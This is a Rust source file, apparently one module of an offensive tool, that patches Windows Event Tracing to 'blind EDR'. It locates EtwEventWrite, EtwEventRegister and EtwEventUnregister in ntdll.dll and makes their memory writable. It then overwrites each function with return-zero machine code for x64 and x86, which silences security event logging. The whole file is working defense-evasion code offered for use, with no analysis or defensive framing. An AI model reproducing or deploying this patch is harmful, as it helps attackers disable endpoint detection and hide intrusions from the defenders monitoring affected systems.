// ETW Patching
// Patches Event Tracing for Windows to blind EDR

use crate::api_resolver::resolve_api;
use std::ptr;
use winapi::shared::minwindef::*;
use winapi::um::errhandlingapi::*;
use winapi::um::libloaderapi::*;
use winapi::um::memoryapi::*;
use winapi::um::winnt::*;

/// Patch ETW functions to prevent event logging
pub unsafe fn patch_etw() -> Result<(), String> {
    // Patch EtwEventWrite
    patch_etw_event_write()?;

    // Patch EtwEventRegister (optional)
    let _ = patch_etw_event_register();

    // Patch EtwEventUnregister (optional)
    let _ = patch_etw_event_unregister();

    Ok(())
}

/// Patch EtwEventWrite function
unsafe fn patch_etw_event_write() -> Result<(), String> {
    // Resolve EtwEventWrite from ntdll.dll
    let etw_event_write = resolve_api("ntdll.dll", "EtwEventWrite")
        .ok_or_else(|| "Failed to resolve EtwEventWrite".to_string())?;

    // Patch: mov rax, 0; ret (x64)
    // Patch: mov eax, 0; ret (x86)
    #[cfg(target_arch = "x86_64")]
    {
        // x64: mov rax, 0; ret
        // Bytes: 48 C7 C0 00 00 00 00 C3
        let patch: [u8; 8] = [0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0xC3];
        let patch_size = patch.len();

        // Change memory protection
        let mut old_protect = 0u32;
        if VirtualProtect(
            etw_event_write,
            patch_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0
        {
            return Err(format!(
                "Failed to change memory protection: {}",
                GetLastError()
            ));
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), etw_event_write as *mut u8, patch_size);

        // Restore protection
        let mut _dummy = 0u32;
        VirtualProtect(etw_event_write, patch_size, old_protect, &mut _dummy);
    }

    #[cfg(target_arch = "x86")]
    {
        // x86: mov eax, 0; ret
        // Bytes: B8 00 00 00 00 C3
        let patch: [u8; 6] = [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3];
        let patch_size = patch.len();

        // Change memory protection
        let mut old_protect = 0u32;
        if VirtualProtect(
            etw_event_write,
            patch_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0
        {
            return Err(format!(
                "Failed to change memory protection: {}",
                GetLastError()
            ));
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), etw_event_write as *mut u8, patch_size);

        // Restore protection
        let mut _dummy = 0u32;
        VirtualProtect(etw_event_write, patch_size, old_protect, &mut _dummy);
    }

    Ok(())
}

/// Patch EtwEventRegister function
unsafe fn patch_etw_event_register() -> Result<(), String> {
    let etw_event_register = resolve_api("ntdll.dll", "EtwEventRegister")
        .ok_or_else(|| "Failed to resolve EtwEventRegister".to_string())?;

    #[cfg(target_arch = "x86_64")]
    {
        let patch: [u8; 8] = [0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0xC3];
        let patch_size = patch.len();

        let mut old_protect = 0u32;
        if VirtualProtect(
            etw_event_register,
            patch_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0
        {
            return Err(format!(
                "Failed to change memory protection: {}",
                GetLastError()
            ));
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), etw_event_register as *mut u8, patch_size);

        let mut _dummy = 0u32;
        VirtualProtect(etw_event_register, patch_size, old_protect, &mut _dummy);
    }

    #[cfg(target_arch = "x86")]
    {
        let patch: [u8; 6] = [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3];
        let patch_size = patch.len();

        let mut old_protect = 0u32;
        if VirtualProtect(
            etw_event_register,
            patch_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0
        {
            return Err(format!(
                "Failed to change memory protection: {}",
                GetLastError()
            ));
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), etw_event_register as *mut u8, patch_size);

        let mut _dummy = 0u32;
        VirtualProtect(etw_event_register, patch_size, old_protect, &mut _dummy);
    }

    Ok(())
}

/// Patch EtwEventUnregister function
unsafe fn patch_etw_event_unregister() -> Result<(), String> {
    let etw_event_unregister = resolve_api("ntdll.dll", "EtwEventUnregister")
        .ok_or_else(|| "Failed to resolve EtwEventUnregister".to_string())?;

    #[cfg(target_arch = "x86_64")]
    {
        let patch: [u8; 8] = [0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0xC3];
        let patch_size = patch.len();

        let mut old_protect = 0u32;
        if VirtualProtect(
            etw_event_unregister,
            patch_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0
        {
            return Err(format!(
                "Failed to change memory protection: {}",
                GetLastError()
            ));
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), etw_event_unregister as *mut u8, patch_size);

        let mut _dummy = 0u32;
        VirtualProtect(etw_event_unregister, patch_size, old_protect, &mut _dummy);
    }

    #[cfg(target_arch = "x86")]
    {
        let patch: [u8; 6] = [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3];
        let patch_size = patch.len();

        let mut old_protect = 0u32;
        if VirtualProtect(
            etw_event_unregister,
            patch_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0
        {
            return Err(format!(
                "Failed to change memory protection: {}",
                GetLastError()
            ));
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), etw_event_unregister as *mut u8, patch_size);

        let mut _dummy = 0u32;
        VirtualProtect(etw_event_unregister, patch_size, old_protect, &mut _dummy);
    }

    Ok(())
}
